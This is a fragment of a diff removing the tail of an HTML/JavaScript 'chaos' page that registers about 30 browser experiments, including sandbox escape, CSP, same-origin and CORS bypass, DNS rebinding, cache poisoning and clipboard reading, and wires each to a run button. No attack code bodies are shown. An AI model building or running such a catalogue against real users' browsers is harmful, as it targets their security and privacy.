-        {name: "Screen Wake Lock", func: exp92_screenWakeLockChaos, desc: "Wake lock loop", danger: false},
-        {name: "VirtualKeyboard", func: exp93_virtualKeyboardChaos, desc: "VirtualKeyboard API", danger: false},
-        {name: "Sandbox Escape", func: exp94_sandboxEscape, desc: "iframe sandbox escape", danger: true},
-        {name: "CSP Bypass", func: exp95_cspBypass, desc: "CSP bypass attempt", danger: false},
-        {name: "SOP Bypass", func: exp96_sopBypass, desc: "Same-origin policy bypass", danger: false},
-        {name: "CORS Bypass", func: exp97_corsBypass, desc: "CORS bypass attempt", danger: false},
-        {name: "DNS Rebinding", func: exp98_dnsRebinding, desc: "DNS rebinding sim", danger: false},
-        {name: "Cache Poison", func: exp99_cachePoisoning, desc: "Cache poisoning", danger: false},
-        {name: "Preload Scanner", func: exp100_preloadScanner, desc: "Preload scanner attack", danger: false},
-        {name: "Custom Elements", func: exp101_customElements, desc: "Custom elements spam", danger: false},
-        {name: "Shadow DOM", func: exp102_shadowDomChaos, desc: "Shadow DOM nesting", danger: false},
-        {name: "Web Components", func: exp103_webComponents, desc: "Component lifecycle", danger: false},
-        {name: "Adoption", func: exp104_adoptionChaos, desc: "Document adoption", danger: false},
-        {name: "Range Chaos", func: exp105_rangeChaos, desc: "Range manipulation", danger: false},
-        {name: "Selection", func: exp106_selectionChaos, desc: "Selection API spam", danger: false},
-        {name: "Focus Chaos", func: exp107_focusChaos, desc: "Focus event flood", danger: false},
-        {name: "Fullscreen", func: exp108_fullscreenChaos, desc: "Fullscreen toggle", danger: false},
-        {name: "Pointer Lock", func: exp109_pointerLockChaos, desc: "Pointer lock spam", danger: false},
-        {name: "Drag Drop", func: exp110_dragDropChaos, desc: "Custom drag drop", danger: false},
-        {name: "Clipboard Read", func: exp111_clipboardReadChaos, desc: "Clipboard read", danger: false},
-        {name: "EyeDropper", func: exp112_eyeDropperChaos, desc: "EyeDropper API", danger: false},
-        {name: "Launch Queue", func: exp113_launchQueueChaos, desc: "Launch queue", danger: false},
-        {name: "File System", func: exp114_fileSystemChaos, desc: "File picker", danger: false},
-        {name: "Idle Detection", func: exp115_idleChaos, desc: "Idle detector", danger: false},
-        {name: "Periodic Sync", func: exp116_periodicSyncChaos, desc: "Background sync", danger: false},
-        {name: "Shared Storage", func: exp117_sharedStorageChaos, desc: "Shared storage", danger: false},
-        {name: "Private Agg", func: exp118_privateAggregationChaos, desc: "Private aggregation", danger: false},
-        {name: "Attribution", func: exp119_attributionChaos, desc: "Attribution reporting", danger: false},
-        {name: "Compute Pressure", func: exp120_computePressureChaos, desc: "Compute pressure", danger: false}
-    ];
-    
-    totalExperiments = experiments.length;
-    counterSpan.innerHTML = `🌀 0/${totalExperiments}`;
-    
-    // Build UI
-    const grid = document.getElementById('chaosGrid');
-    experiments.forEach((exp, idx) => {
-        const card = document.createElement('div');
-        card.className = 'chaos-card';
-        card.innerHTML = `
-            <div class="card-header">
-                <span>💀 ${exp.name}</span>
-                <span class="exp-number">#${(idx+1).toString().padStart(3,'0')}</span>
-            </div>
-            <div class="card-body">
-                <div class="chaos-desc">${exp.desc}</div>
-                <button class="${exp.danger ? 'danger' : ''}" onclick="window['exp${idx+1}']()">⚡ RUN ${exp.name}</button>
-            </div>
-        `;
-        grid.appendChild(card);
     });
-    
-    // Expose all functions globally
-    for(let i = 1; i <= experiments.length; i++) {
-        window[`exp${i}`] = experiments[i-1].func;
-    }
-    
-    addChaosLog(`💀 120+ ABSURD EXPERIMENTS LOADED`, 'chaos');
-    addChaosLog(`🌀 TOTAL: ${totalExperiments} techniques`, 'success');
-    addChaosLog(`🔥 PREPARE FOR CHAOS`, 'exploit');
-    
-    // Auto-execute a few demos
-    setTimeout(() => {
-        addChaosLog("💀 Click any button to unleash chaos", 'info');
-    }, 1000);
 </script>
 </body>
 </html>
